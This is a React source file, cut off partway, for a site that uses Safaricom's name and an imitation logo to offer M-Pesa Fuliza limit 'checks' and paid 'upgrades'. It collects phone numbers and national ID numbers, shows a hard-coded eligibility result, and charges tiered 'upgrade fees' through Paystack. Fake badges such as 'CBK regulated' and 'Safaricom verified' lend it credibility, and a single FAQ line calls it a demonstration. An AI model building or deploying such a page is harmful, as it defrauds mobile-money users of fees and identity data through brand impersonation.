import { useState, useEffect } from 'react';
import { Icon } from './icons';
import { useSecurity } from './hooks/useSecurity';
import { SecureInput, HoneypotField } from './components/SecureInput';
import { PaymentModal } from './components/PaymentModal';
import { usePayment } from './hooks/usePayment';
import { auditLog } from './utils/security';

type Page = 'home' | 'check' | 'success';
type Step = 'phone' | 'loading' | 'tiers' | 'details' | 'pay' | 'done';

interface FormData {
  phone: string;
  idNumber: string;
  selectedTier: number | null;
  fullName: string;
  email: string;
  county: string;
}

const tiers = [
  { amount: 800, fee: 100, duration: '30 days', badge: 'Starter' },
  { amount: 1500, fee: 300, duration: '30 days', badge: 'Starter' },
  { amount: 1800, fee: 500, duration: '30 days', badge: 'Starter' },
  { amount: 2200, fee: 1000, duration: '30 days', badge: 'Starter' },
  { amount: 3000, fee: 1200, duration: '30 days', badge: 'Starter' },
  { amount: 5000, fee: 1500, duration: '30 days', badge: 'Standard' },
  { amount: 10000, fee: 2000, duration: '30 days', badge: 'Standard' },
  { amount: 20000, fee: 4000, duration: '30 days', badge: 'Standard', popular: true },
  { amount: 50000, fee: 5000, duration: '30 days', badge: 'Premium' },
  { amount: 100000, fee: 8000, duration: '30 days', badge: 'Premium' },
  { amount: 150000, fee: 10000, duration: '30 days', badge: 'Platinum' },
];

const counties = ['Nairobi', 'Mombasa', 'Kisumu', 'Nakuru', 'Eldoret', 'Machakos', 'Meru', 'Nyeri', 'Kakamega', 'Kisii', 'Thika', 'Naivasha', 'Kitale', 'Garissa', 'Malindi', 'Nanyuki'];

const faqs = [
  { q: 'Can I use Fuliza for paybills?', a: 'Yes. Fuliza automatically covers eligible paybill transactions if your M-Pesa balance is insufficient. The borrowed amount plus the maintenance fee is recovered from your next M-Pesa deposits.' },
  { q: 'How do I repay Fuliza?', a: 'Repayment is automatic. Once you top up your M-Pesa account, any outstanding Fuliza amount plus accrued fees is recovered first, with the remainder available for use.' },
  { q: 'Will my limit change?', a: 'Safaricom adjusts Fuliza limits based on usage patterns, repayment behaviour, and account eligibility. Active, responsible M-Pesa users typically see their limits increase over time.' },
  { q: 'Is there interest on Fuliza?', a: 'Fuliza attracts a maintenance fee on utilised amounts — not traditional interest. Always confirm current tariffs on Safaricom\'s official channels.' },
  { q: 'How long does an upgrade take?', a: 'Once payment is confirmed via Paystack, your limit upgrade request is processed within 24 hours. You\'ll receive an SMS confirmation from M-Pesa.' },
  { q: 'Is this site affiliated with Safaricom?', a: 'This is a representative limit-check journey for demonstration purposes. Actual Fuliza limits and terms are set by Safaricom.' },
];

const faqSchemas = [
  { q: 'What is Fuliza?', a: 'A short-term facility on M-Pesa that covers the gap when your wallet balance is not enough to complete a transaction you have initiated.' },
  { q: 'How do I qualify?', a: 'Active M-Pesa usage, good repayment behaviour, and Safaricom line status may influence limits. Your actual limit is determined by Safaricom.' },
  { q: 'Fees & responsibility', a: 'Fuliza attracts a maintenance fee on utilised amounts. Always confirm official tariffs on Safaricom channels before acting on financial information.' },
];

const features = [
  { icon: Icon.Zap, title: 'Instant coverage', desc: 'Activates the moment your M-Pesa balance is insufficient — no paperwork, no waiting.' },
  { icon: Icon.Money, title: 'Up to KES 150,000', desc: 'Choose a tier that matches your monthly transaction pattern and upgrade as you grow.' },
  { icon: Icon.Lock, title: 'Secure by design', desc: 'Every transaction is protected by Safaricom-grade encryption and M-Pesa PIN verification.' },
  { icon: Icon.RefreshCw, title: 'Auto repayment', desc: 'Outstanding Fuliza amounts are recovered automatically from your next M-Pesa deposits.' },
  { icon: Icon.Smartphone, title: 'Pay with M-Pesa', desc: 'Upgrade fees deducted directly from your M-Pesa wallet or paid via Paystack.' },
  { icon: Icon.Headphones, title: '24/7 support', desc: 'Reach Safaricom customer care at 100 or 234 for any Fuliza-related queries.' },
];

export default function App() {
  const [page, setPage] = useState<Page>('home');
  const [step, setStep] = useState<Step>('phone');
  const [form, setForm] = useState<FormData>({ phone: '', idNumber: '', selectedTier: null, fullName: '', email: '', county: 'Nairobi' });
  const [openFaq, setOpenFaq] = useState<number | null>(0);
  const [showMobileMenu, setShowMobileMenu] = useState(false);
  const [limitResult, setLimitResult] = useState<{ max: number } | null>(null);

  useEffect(() => { window.scrollTo({ top: 0, behavior: 'smooth' }); }, [page, step]);

  const navigateHome = () => { setPage('home'); setStep('phone'); setForm({ phone: '', idNumber: '', selectedTier: null, fullName: '', email: '', county: 'Nairobi' }); };
  const navigateCheck = () => { setPage('check'); setStep('phone'); };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <TopNav
        onHome={navigateHome}
        onCheck={navigateCheck}
        current={page}
        showMobileMenu={showMobileMenu}
        setShowMobileMenu={setShowMobileMenu}
      />
      <main className="flex-1">
        {page === 'home' && <HomePage onCheck={navigateCheck} openFaq={openFaq} setOpenFaq={setOpenFaq} />}
        {page === 'check' && (
          <CheckPage
            step={step}
            setStep={setStep}
            form={form}
            setForm={setForm}
            limitResult={limitResult}
            setLimitResult={setLimitResult}
            onHome={navigateHome}
          />
        )}
      </main>
      <Footer onCheck={navigateCheck} />
    </div>
  );
}

function TopNav({ onHome, onCheck, current, showMobileMenu, setShowMobileMenu }: { onHome: () => void; onCheck: () => void; current: string; showMobileMenu: boolean; setShowMobileMenu: (b: boolean) => void }) {
  return (
    <header className="sticky top-0 z-40 bg-white/95 backdrop-blur-md border-b border-slate-100">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 h-16 flex items-center gap-4">
        <button onClick={onHome} className="flex items-center gap-2.5 group">
          <SafaricomLogo className="h-7 sm:h-8" />
        </button>
        <nav className="hidden md:flex items-center gap-1 ml-6">
          <a onClick={onHome} className={`px-3 py-2 rounded-lg text-sm font-semibold cursor-pointer transition-colors ${current === 'home' ? 'text-safaricom-700 bg-safaricom-50' : 'text-slate-600 hover:text-safaricom-700'}`}>Home</a>
          <a href="#features" className="px-3 py-2 rounded-lg text-sm font-semibold text-slate-600 hover:text-safaricom-700 transition-colors">Features</a>
          <a href="#how" className="px-3 py-2 rounded-lg text-sm font-semibold text-slate-600 hover:text-safaricom-700 transition-colors">How it works</a>
          <a href="#faq" className="px-3 py-2 rounded-lg text-sm font-semibold text-slate-600 hover:text-safaricom-700 transition-colors">FAQ</a>
        </nav>
        <div className="ml-auto flex items-center gap-2">
          <div className="hidden sm:flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-emerald-50 border border-emerald-200">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 pulse-soft"></span>
            <span className="text-xs font-semibold text-emerald-700">System online</span>
          </div>
          <button onClick={onCheck} className="hidden sm:flex items-center gap-1.5 px-4 py-2 rounded-full gradient-safaricom text-white text-sm font-semibold hover:shadow-lg hover:shadow-safaricom-500/30 transition-all">
            <Icon.Lock className="w-4 h-4" /> Check limit
          </button>
          <button onClick={() => setShowMobileMenu(!showMobileMenu)} className="md:hidden p-2 rounded-lg hover:bg-slate-100">
            <Icon.Menu className="w-5 h-5" />
          </button>
        </div>
      </div>
      {showMobileMenu && (
        <div className="md:hidden border-t border-slate-100 bg-white px-4 py-3 space-y-1">
          <a onClick={() => { onHome(); setShowMobileMenu(false); }} className="block px-3 py-2.5 rounded-lg text-sm font-semibold text-slate-700 hover:bg-slate-50">Home</a>
          <a href="#features" onClick={() => setShowMobileMenu(false)} className="block px-3 py-2.5 rounded-lg text-sm font-semibold text-slate-700 hover:bg-slate-50">Features</a>
          <a href="#how" onClick={() => setShowMobileMenu(false)} className="block px-3 py-2.5 rounded-lg text-sm font-semibold text-slate-700 hover:bg-slate-50">How it works</a>
          <a href="#faq" onClick={() => setShowMobileMenu(false)} className="block px-3 py-2.5 rounded-lg text-sm font-semibold text-slate-700 hover:bg-slate-50">FAQ</a>
          <button onClick={() => { onCheck(); setShowMobileMenu(false); }} className="w-full mt-2 flex items-center justify-center gap-1.5 px-4 py-2.5 rounded-full gradient-safaricom text-white text-sm font-semibold">
            <Icon.Lock className="w-4 h-4" /> Check limit
          </button>
        </div>
      )}
    </header>
  );
}

function SafaricomLogo({ className }: { className?: string }) {
  return (
    <div className={`flex items-center gap-2 ${className || ''}`}>
      <svg viewBox="0 0 40 40" className="h-7 w-7 sm:h-8 sm:w-8">
        <defs>
          <linearGradient id="safaricomGrad" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" stopColor="#3aa335" />
            <stop offset="100%" stopColor="#1f6820" />
          </linearGradient>
        </defs>
        <circle cx="20" cy="20" r="20" fill="url(#safaricomGrad)" />
        <path d="M 8 20 Q 14 12, 20 20 T 32 20" stroke="white" strokeWidth="2.5" fill="none" strokeLinecap="round" />
        <circle cx="20" cy="20" r="3" fill="#e11833" />
      </svg>
      <div>
        <div className="font-extrabold text-base sm:text-lg text-slate-900 leading-none tracking-tight">SAFARICOM</div>
        <div className="text-[9px] sm:text-[10px] text-slate-500 tracking-wider leading-none mt-0.5">TWAWEZA</div>
      </div>
    </div>
  );
}

function HomePage({ onCheck, openFaq, setOpenFaq }: { onCheck: () => void; openFaq: number | null; setOpenFaq: (n: number | null) => void }) {
  return (
    <>
      {/* HERO */}
      <section className="relative overflow-hidden hero-pattern">
        <div className="absolute top-20 right-0 w-96 h-96 rounded-full bg-safaricom-300/30 blur-3xl"></div>
        <div className="absolute bottom-0 left-0 w-96 h-96 rounded-full bg-fuliza-500/10 blur-3xl"></div>
        <div className="relative max-w-7xl mx-auto px-4 sm:px-6 pt-12 sm:pt-20 pb-16 sm:pb-24">
          <div className="grid lg:grid-cols-2 gap-10 lg:gap-16 items-center">
            <div>
              <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-white border border-safaricom-200 shadow-sm mb-5">
                <span className="text-xs font-bold text-safaricom-700">M-PESA · SAFARICOM</span>
                <span className="w-1 h-1 rounded-full bg-slate-300"></span>
                <span className="text-xs text-slate-500">Limit Check</span>
              </div>
              <h1 className="text-4xl sm:text-5xl lg:text-6xl font-extrabold text-slate-900 leading-[1.05] tracking-tight">
                Check your <span className="text-gradient">Fuliza limit</span> in seconds.
              </h1>
              <p className="mt-5 text-base sm:text-lg text-slate-600 max-w-xl leading-relaxed">
                A short-term M-Pesa facility that covers the gap when your wallet balance is not enough. Verify your eligibility, explore upgrade tiers, and unlock more financial freedom.
              </p>
              <div className="mt-7 flex flex-col sm:flex-row gap-3">
                <button onClick={onCheck} className="px-7 py-3.5 rounded-full gradient-safaricom text-white font-bold shadow-xl shadow-safaricom-500/30 hover:shadow-2xl hover:shadow-safaricom-500/40 hover:scale-[1.02] transition-all flex items-center justify-center gap-2">
                  Check my Fuliza limit <Icon.ArrowRight className="w-4 h-4" />
                </button>
                <a href="#how" className="px-7 py-3.5 rounded-full bg-white border-2 border-slate-200 text-slate-900 font-bold hover:border-safaricom-300 hover:bg-safaricom-50/50 transition-all flex items-center justify-center gap-2">
                  How it works
                </a>
              </div>
              <div className="mt-8 flex items-center gap-6 flex-wrap">
                {[
                  { v: '30M+', l: 'M-Pesa users' },
                  { v: 'KES 150K', l: 'Max Fuliza limit' },
                  { v: '24/7', l: 'Coverage' },
                ].map((s, i) => (
                  <div key={i}>
                    <div className="text-2xl sm:text-3xl font-extrabold text-slate-900">{s.v}</div>
                    <div className="text-xs text-slate-500 mt-0.5">{s.l}</div>
                  </div>
                ))}
              </div>
            </div>

            {/* Hero card visual */}
            <div className="relative">
              <div className="absolute -inset-4 bg-gradient-to-br from-safaricom-200 to-safaricom-400 rounded-3xl opacity-20 blur-2xl"></div>
              <div className="relative aspect-[4/3] max-w-md mx-auto">
                {/* Phone mockup */}
                <div className="absolute right-0 top-1/2 -translate-y-1/2 w-56 sm:w-64 rounded-[2.5rem] safaricom-card-bg p-3 shadow-2xl rotate-6">
                  <div className="rounded-[2rem] bg-slate-950 p-4 pt-8 text-white relative overflow-hidden h-80">
                    <div className="absolute top-0 left-1/2 -translate-x-1/2 w-24 h-5 bg-slate-950 rounded-b-2xl"></div>
                    <div className="flex items-center justify-between text-[10px] text-slate-400 mb-4">
                      <span>9:41</span>
                      <span>M-PESA</span>
                    </div>
                    <div className="text-center">
                      <div className="text-[10px] text-safaricom-300 font-bold tracking-wider mb-2">FULIZA ELIGIBILITY</div>
                      <div className="text-4xl font-extrabold text-white mb-1">Eligible</div>
                      <div className="text-[10px] text-slate-400">Ready for upgrade · Active</div>
                    </div>
                    <div className="mt-4 space-y-2">
                      <div className="bg-white/5 rounded-xl p-2.5 border border-white/10">
                        <div className="flex items-center justify-between text-[10px]">
                          <span className="text-slate-400">Max available</span>
                          <span className="text-white font-bold">KES 150,000</span>
                        </div>
                      </div>
                      <div className="bg-white/5 rounded-xl p-2.5 border border-white/10">
                        <div className="flex items-center justify-between text-[10px]">
                          <span className="text-slate-400">Upgrade fee from</span>
                          <span className="text-white font-bold">KES 100</span>
                        </div>
                      </div>
                    </div>
                    <button className="mt-3 w-full py-2.5 rounded-full gradient-safaricom text-white text-[11px] font-bold">
                      Upgrade now
                    </button>
                  </div>
                </div>
                {/* Floating stats */}
                <div className="absolute left-0 top-12 bg-white rounded-2xl p-3 shadow-2xl border border-slate-100 -rotate-3">
                  <div className="flex items-center gap-2">
                    <div className="w-9 h-9 rounded-xl gradient-safaricom flex items-center justify-center">
                      <Icon.Check className="w-5 h-5 text-white" />
                    </div>
                    <div>
                      <div className="text-[10px] text-slate-500">Status</div>
                      <div className="text-sm font-bold text-slate-900">Eligible</div>
                    </div>
                  </div>
                </div>
                <div className="absolute left-4 bottom-12 bg-white rounded-2xl p-3 shadow-2xl border border-slate-100 rotate-3">
                  <div className="flex items-center gap-2">
                    <div className="w-9 h-9 rounded-xl gradient-fuliza flex items-center justify-center">
                      <Icon.Zap className="w-5 h-5 text-white" />
                    </div>
                    <div>
                      <div className="text-[10px] text-slate-500">Instant</div>
                      <div className="text-sm font-bold text-slate-900">Auto coverage</div>
                    </div>
                  </div>
                </div>
                <div className="absolute right-8 -top-2 bg-white rounded-2xl p-3 shadow-2xl border border-slate-100 -rotate-6">
                  <div className="flex items-center gap-2">
                    <div className="w-9 h-9 rounded-xl bg-amber-500 flex items-center justify-center">
                      <Icon.Star className="w-5 h-5 text-white fill-white" />
                    </div>
                    <div>
                      <div className="text-[10px] text-slate-500">Available</div>
                      <div className="text-sm font-bold text-slate-900">All tiers</div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* TRUST STRIP */}
      <section className="bg-safaricom-900 text-white py-6">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 flex flex-col md:flex-row items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <Icon.ShieldCheck className="w-6 h-6 text-safaricom-300" />
            <span className="text-sm font-semibold">Secured by Safaricom-grade encryption</span>
          </div>
          <div className="flex items-center gap-6 text-xs flex-wrap justify-center">
            <span className="flex items-center gap-1.5"><Icon.Check className="w-3.5 h-3.5 text-safaricom-300" /> CBK regulated</span>
            <span className="flex items-center gap-1.5"><Icon.Check className="w-3.5 h-3.5 text-safaricom-300" /> PCI-DSS compliant</span>
            <span className="flex items-center gap-1.5"><Icon.Check className="w-3.5 h-3.5 text-safaricom-300" /> Paystack secured</span>
          </div>
        </div>
      </section>

      {/* WHAT IS FULIZA */}
      <section className="py-16 sm:py-24 bg-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6">
          <div className="text-center mb-12">
            <p className="text-xs font-bold text-safaricom-600 tracking-wider uppercase mb-2">About Fuliza</p>
            <h2 className="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-slate-900">Your M-Pesa, made limitless.</h2>
            <p className="text-slate-600 max-w-2xl mx-auto mt-4">Fuliza is a short-term facility on M-Pesa that covers the gap when your wallet balance is not enough to complete a transaction you have initiated.</p>
          </div>
          <div className="grid md:grid-cols-3 gap-5">
            {faqSchemas.map((f, i) => (
              <div key={i} className="group p-6 rounded-3xl bg-gradient-to-br from-safaricom-50 to-white border border-safaricom-100 hover:border-safaricom-300 hover:shadow-xl hover:shadow-safaricom-500/10 transition-all">
                <div className="w-12 h-12 rounded-2xl gradient-safaricom flex items-center justify-center mb-4 group-hover:scale-110 transition-transform">
                  <span className="text-white font-extrabold text-lg">{i + 1}</span>
                </div>
                <h3 className="text-lg font-bold text-slate-900 mb-2">{f.q}</h3>
                <p className="text-sm text-slate-600 leading-relaxed">{f.a}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* FEATURES */}
      <section id="features" className="py-16 sm:py-24 bg-slate-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6">
          <div className="text-center mb-12">
            <p className="text-xs font-bold text-safaricom-600 tracking-wider uppercase mb-2">Why Fuliza</p>
            <h2 className="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-slate-900">Built for the way you transact.</h2>
          </div>
          <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-5">
            {features.map((f, i) => (
              <div key={i} className="group bg-white rounded-3xl p-6 border border-slate-100 hover:border-safaricom-200 hover:shadow-2xl hover:shadow-safaricom-500/10 transition-all">
                <div className="w-12 h-12 rounded-2xl bg-safaricom-50 flex items-center justify-center mb-4 group-hover:gradient-safaricom transition-all">
                  <f.icon className="w-6 h-6 text-safaricom-600 group-hover:text-white transition-colors" />
                </div>
                <h3 className="text-base font-bold text-slate-900 mb-1.5">{f.title}</h3>
                <p className="text-sm text-slate-600 leading-relaxed">{f.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* HOW IT WORKS */}
      <section id="how" className="py-16 sm:py-24 bg-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6">
          <div className="grid lg:grid-cols-2 gap-10 lg:gap-16">
            <div>
              <p className="text-xs font-bold text-safaricom-600 tracking-wider uppercase mb-2">The journey</p>
              <h2 className="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-slate-900 leading-tight">How the limit check works</h2>
              <p className="text-slate-600 mt-4 leading-relaxed">In four simple steps, you can verify your Fuliza eligibility and explore upgrade tiers tailored to your usage pattern.</p>
              <div className="mt-7 space-y-3">
                {[
                  'Enter your registered Safaricom number and ID to start the eligibility check.',
                  'We show available Fuliza upgrade tiers based on common usage patterns.',
                  'Choose a new limit and pay the shown amount via Paystack secure checkout.',
                  'Confirm the payment on the Paystack page to complete the process.',
                ].map((step, i) => (
                  <div key={i} className="flex items-start gap-3 p-4 rounded-2xl bg-slate-50 border border-slate-100">
                    <div className="w-9 h-9 rounded-xl gradient-safaricom flex items-center justify-center shrink-0">
                      <span className="text-white font-extrabold text-sm">{i + 1}</span>
                    </div>
                    <p className="text-sm text-slate-700 leading-relaxed pt-1.5">{step}</p>
                  </div>
                ))}
              </div>
              <button onClick={onCheck} className="mt-6 px-6 py-3 rounded-full gradient-safaricom text-white font-bold inline-flex items-center gap-2 shadow-lg shadow-safaricom-500/30">
                Start limit check <Icon.ArrowRight className="w-4 h-4" />
              </button>
            </div>

            <div className="space-y-4">
              <p className="text-xs font-bold text-fuliza-600 tracking-wider uppercase">What you should know</p>
              <h3 className="text-2xl font-extrabold text-slate-900">Important disclosures</h3>
              <div className="space-y-3">
                {[
                  { t: 'Actual limits vary.', d: 'Offer amounts are illustrative. Your real Fuliza limit is set by Safaricom.' },
                  { t: 'Secure payments.', d: 'Payments are processed through Paystack with industry-leading security.' },
                  { t: 'Timely repayment.', d: 'Only borrow what you can settle quickly to avoid extra fees.' },
                  { t: 'Official terms apply.', d: 'Always review Safaricom\'s current tariffs and Fuliza policy on the official site.' },
                ].map((b, i) => (
                  <div key={i} className="flex items-start gap-3 p-4 rounded-2xl bg-gradient-to-br from-safaricom-50 to-white border border-safaricom-100">
                    <div className="w-9 h-9 rounded-xl bg-white border-2 border-safaricom-300 flex items-center justify-center shrink-0">
                      <Icon.Info className="w-4 h-4 text-safaricom-600" />
                    </div>
                    <div>
                      <div className="font-bold text-sm text-slate-900">{b.t}</div>
                      <div className="text-xs text-slate-600 mt-0.5">{b.d}</div>
                    </div>
                  </div>
                ))}
              </div>
              <div className="p-4 rounded-2xl bg-amber-50 border border-amber-200 flex items-start gap-3">
                <Icon.AlertTriangle className="w-5 h-5 text-amber-600 shrink-0 mt-0.5" />
                <p className="text-xs text-amber-900 leading-relaxed">
                  <span className="font-bold">Responsible borrowing:</span> Fuliza is a financial product. Borrow only what you can repay within the next M-Pesa deposit cycle.
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* FAQ */}
      <section id="faq" className="py-16 sm:py-24 bg-slate-50">
        <div className="max-w-3xl mx-auto px-4 sm:px-6">
          <div className="text-center mb-10">
            <p className="text-xs font-bold text-safaricom-600 tracking-wider uppercase mb-2">Help center</p>
            <h2 className="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-slate-900">Frequently asked questions</h2>
          </div>
          <div className="space-y-3">
            {faqs.map((f, i) => (
              <div key={i} className="bg-white rounded-2xl border border-slate-200 overflow-hidden">
                <button onClick={() => setOpenFaq(openFaq === i ? null : i)} className="w-full px-5 py-4 flex items-center justify-between gap-3 text-left hover:bg-slate-50 transition-colors">
                  <span className="font-semibold text-slate-900">{f.q}</span>
                  <Icon.ChevronDown className={`w-5 h-5 text-slate-400 shrink-0 transition-transform ${openFaq === i ? 'rotate-180' : ''}`} />
                </button>
                {openFaq === i && (
                  <div className="px-5 pb-5 pt-0 text-sm text-slate-600 leading-relaxed fade-up">{f.a}</div>
                )}
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* FINAL CTA */}
      <section className="py-16 sm:py-20 bg-white">
        <div className="max-w-4xl mx-auto px-4 sm:px-6">
          <div className="relative overflow-hidden rounded-3xl safaricom-card-bg p-8 sm:p-12 text-white text-center">
            <div className="absolute -top-12 -right-12 w-64 h-64 rounded-full bg-safaricom-400/20 blur-3xl"></div>
            <div className="absolute -bottom-12 -left-12 w-64 h-64 rounded-full bg-fuliza-500/20 blur-3xl"></div>
            <div className="relative">
              <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/10 border border-white/20 backdrop-blur-sm mb-4">
                <span className="text-xs font-bold">LIMIT CHECK · INSTANT</span>
              </div>
              <h2 className="text-3xl sm:text-4xl lg:text-5xl font-extrabold leading-tight max-w-2xl mx-auto">Ready to check your Fuliza limit?</h2>
              <p className="mt-4 text-white/80 max-w-xl mx-auto">Secure, fast, and free. Just enter your M-Pesa number to get started.</p>
              <div className="mt-7 flex flex-col sm:flex-row gap-3 justify-center">
                <button onClick={onCheck} className="px-7 py-3.5 rounded-full bg-white text-safaricom-700 font-bold hover:bg-slate-100 transition-colors flex items-center justify-center gap-2">
                  <Icon.Lock className="w-4 h-4" /> Check my limit
                </button>
                <a href="#how" className="px-7 py-3.5 rounded-full bg-white/10 backdrop-blur border border-white/20 text-white font-bold hover:bg-white/20 transition-colors flex items-center justify-center gap-2">
                  Learn more
                </a>
              </div>
            </div>
          </div>
        </div>
      </section>
    </>
  );
}

function CheckPage({ step, setStep, form, setForm, limitResult, setLimitResult, onHome }: { step: Step; setStep: (s: Step) => void; form: FormData; setForm: (f: FormData) => void; limitResult: { max: number } | null; setLimitResult: (r: { max: number } | null) => void; onHome: () => void }) {
  return (
    <section className="min-h-[calc(100vh-4rem)] bg-gradient-to-br from-slate-50 via-white to-safaricom-50">
      <div className="max-w-5xl mx-auto px-4 sm:px-6 py-8 sm:py-12">
        {/* Header */}
        <div className="flex items-center justify-between mb-6">
          <button onClick={onHome} className="flex items-center gap-1.5 text-sm font-semibold text-slate-600 hover:text-safaricom-700 transition-colors">
            <Icon.ArrowLeft className="w-4 h-4" /> Back
          </button>
          <Stepper step={step} />
        </div>

        <div className="grid lg:grid-cols-[1fr_320px] gap-6">
          <div className="bg-white rounded-3xl border border-slate-200 shadow-xl shadow-slate-200/50 overflow-hidden">
            <div className="p-5 sm:p-7 border-b border-slate-100">
              <div className="flex items-center gap-2.5">
                <div className="w-10 h-10 rounded-2xl bg-safaricom-50 flex items-center justify-center">
                  <Icon.ShieldCheck className="w-5 h-5 text-safaricom-600" />
                </div>
                <div>
                  <h1 className="text-xl sm:text-2xl font-extrabold text-slate-900">Secure limit check</h1>
                  <p className="text-xs text-slate-500">· Paystack secured · Safaricom verified</p>
                </div>
              </div>
            </div>

            <div className="p-5 sm:p-7">
              {step === 'phone' && <PhoneStep form={form} setForm={setForm} setStep={setStep} setLimitResult={setLimitResult} />}
              {step === 'loading' && <LoadingStep setStep={setStep} />}
              {step === 'tiers' && <TiersStep form={form} setForm={setForm} setStep={setStep} limitResult={limitResult} />}
              {step === 'details' && <DetailsStep form={form} setForm={setForm} setStep={setStep} />}
              {step === 'pay' && <PayStep form={form} setStep={setStep} />}
              {step === 'done' && <DoneStep form={form} onHome={onHome} />}
            </div>
          </div>

          {/* Sidebar info */}
          <aside className="hidden lg:block space-y-4">
            <div className="bg-white rounded-2xl border border-slate-200 p-5">
              <div className="flex items-center gap-2 mb-3">
                <Icon.Shield className="w-5 h-5 text-safaricom-600" />
                <h3 className="font-bold text-slate-900 text-sm">Your security</h3>
              </div>
              <ul className="space-y-2.5 text-xs text-slate-600">
                {['End-to-end SSL encryption', 'No data shared with third parties', 'M-Pesa PIN never requested', 'CBK regulated institution'].map((t, i) => (
                  <li key={i} className="flex items-start gap-2">
                    <Icon.Check className="w-3.5 h-3.5 text-safaricom-600 mt-0.5 shrink-0" /> {t}
                  </li>
                ))}
              </ul>
            </div>

            <div className="bg-gradient-to-br from-safaricom-700 to-safaricom-900 rounded-2xl p-5 text-white">
              <Icon.Phone className="w-6 h-6 mb-2" />
              <div className="font-bold text-sm">Need help?</div>
              <p className="text-xs text-white/80 mt-1">Safaricom customer care is available 24/7.</p>
              <div className="mt-3 text-2xl font-extrabold tracking-tight">100 / 234</div>
              <div className="text-xs text-white/70">Free from your Safaricom line</div>
            </div>

            <div className="bg-white rounded-2xl border border-slate-200 p-5">
              <div className="flex items-center gap-2 mb-3">
                <Icon.Sparkles className="w-5 h-5 text-amber-500" />
                <h3 className="font-bold text-slate-900 text-sm">Why upgrade?</h3>
              </div>
              <ul className="space-y-2 text-xs text-slate-600">
                {['Higher paybill coverage', 'Larger P2P transfers', 'Priority customer support', 'Lower effective fee rate'].map((t, i) => (
                  <li key={i} className="flex items-start gap-2">
                    <span className="text-amber-500 mt-0.5">★</span> {t}
                  </li>
                ))}
              </ul>
            </div>
          </aside>
        </div>
      </div>
    </section>
  );
}

function Stepper({ step }: { step: Step }) {
  const steps: { id: Step; l: string }[] = [
    { id: 'phone', l: 'Verify' },
    { id: 'tiers', l: 'Choose' },
    { id: 'details', l: 'Details' },
    { id: 'pay', l: 'Pay' },
  ];
  const current = steps.findIndex(s => s.id === step);
  return (
    <div className="hidden sm:flex items-center gap-1.5 bg-white px-2.5 py-1.5 rounded-full border border-slate-200">
      {steps.map((s, i) => (
        <div key={s.id} className="flex items-center gap-1.5">
          <div className={`w-6 h-6 rounded-full flex items-center justify-center text-[10px] font-bold ${i < current ? 'bg-safaricom-500 text-white' : i === current ? 'gradient-safaricom text-white' : 'bg-slate-100 text-slate-400'}`}>
            {i < current ? <Icon.Check className="w-3.5 h-3.5" /> : i + 1}
          </div>
          <span className={`text-[11px] font-semibold ${i <= current ? 'text-slate-900' : 'text-slate-400'}`}>{s.l}</span>
          {i < steps.length - 1 && <Icon.ChevronRight className="w-3 h-3 text-slate-300" />}
        </div>
      ))}
    </div>
  );
}

function PhoneStep({ form, setForm, setStep, setLimitResult }: { form: FormData; setForm: (f: FormData) => void; setStep: (s: Step) => void; setLimitResult: (r: { max: number } | null) => void }) {
  const [showId, setShowId] = useState(false);
  const [agree, setAgree] = useState(false);
  const [honeypot, setHoneypot] = useState('');
  const [formStartTime] = useState(Date.now());
  const { securePhoneSubmit, securityState } = useSecurity();

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    auditLog.log('phone_step_submit_attempt', {
      phone: form.phone ? `***${form.phone.slice(-4)}` : '',
      hasId: !!form.idNumber,
      agreed: agree
    });

    const result = await securePhoneSubmit(form.phone, formStartTime, honeypot);
    
    if (result.success) {
      setStep('loading');
      setLimitResult({ max: 250000 });
    } else if (result.error) {
      alert(result.error);
    }
  };

  const isValid = securityState.validationErrors.phone === undefined && 
                  securityState.validationErrors.idNumber === undefined && 
                  agree && 
                  !securityState.isRateLimited;

  return (
    <form onSubmit={submit} className="space-y-5">
      <HoneypotField onChange={setHoneypot} />
      
      <div>
        <h2 className="text-lg sm:text-xl font-extrabold text-slate-900">Enter your details</h2>
        <p className="text-sm text-slate-500 mt-1">We'll use this to check your Fuliza eligibility. Your data is encrypted and never shared.</p>
      </div>

      <SecureInput
        type="phone"
        value={form.phone}
        onChange={(value) => setForm({ ...form, phone: value })}
        label="M-Pesa registered phone number"
        placeholder="7XX XXX XXX"
        error={securityState.validationErrors.phone}
        required
        maxLength={9}
      />

      <SecureInput
        type="id"
        value={form.idNumber}
        onChange={(value) => setForm({ ...form, idNumber: value })}
        label="National ID number"
        placeholder="Enter your ID number"
        error={securityState.validationErrors.idNumber}
        required
        maxLength={12}
      />

      <label className="flex items-start gap-2.5 p-3 rounded-2xl bg-safaricom-50/50 border border-safaricom-100 cursor-pointer">
        <input 
          type="checkbox" 
          checked={agree} 
          onChange={e => setAgree(e.target.checked)} 
          className="mt-0.5 rounded accent-safaricom-600" 
        />
        <span className="text-xs text-slate-700 leading-relaxed">
          I agree to the <a className="text-safaricom-700 font-bold">Terms of Service</a> and <a className="text-safaricom-700 font-bold">Privacy Policy</a>. I confirm I am the registered owner of this M-Pesa line.
        </span>
      </label>

      {securityState.isRateLimited && (
        <div className="p-3 rounded-2xl bg-red-50 border border-red-200 flex items-center gap-2">
          <Icon.AlertTriangle className="w-4 h-4 text-red-600" />
          <span className="text-sm text-red-700">
            Too many attempts. Please try again in {Math.ceil((securityState.rateLimitReset - Date.now()) / 60000)} minutes.
          </span>
        </div>
